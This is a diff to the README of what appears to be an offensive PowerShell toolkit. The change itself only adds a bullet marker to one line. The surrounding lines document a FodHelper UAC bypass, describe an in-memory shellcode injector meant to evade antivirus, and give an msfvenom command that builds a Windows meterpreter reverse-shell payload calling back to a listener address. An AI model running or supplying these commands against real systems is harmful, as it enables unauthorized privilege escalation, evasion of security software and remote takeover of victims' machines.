@@ -66,7 +66,7 @@ Invoke-FodHelperBypass -Program "powershell" -Verbose
 Invoke-FodHelperBypass -Program "cmd /c msf.exe" -Verbose
 ```
 
-Invoke-InMemoryPayload is used for AV Evasion using an In-Memory injection. This will require the runner to generate an msfvenom payload using a command similar to the example below, and entering the "[Byte[]] $buf" variable into Invoke-InMemoryPayloads "ShellCode" parameter.
+- Invoke-InMemoryPayload is used for AV Evasion using an In-Memory injection. This will require the runner to generate an msfvenom payload using a command similar to the example below, and entering the "[Byte[]] $buf" variable into Invoke-InMemoryPayloads "ShellCode" parameter.
 ```bash
 # Generate payload to use
 msfvenom -p windows/meterpreter/shell_reverse_tcp LHOST=192.168.137.129 LPORT=1337 -f powershell
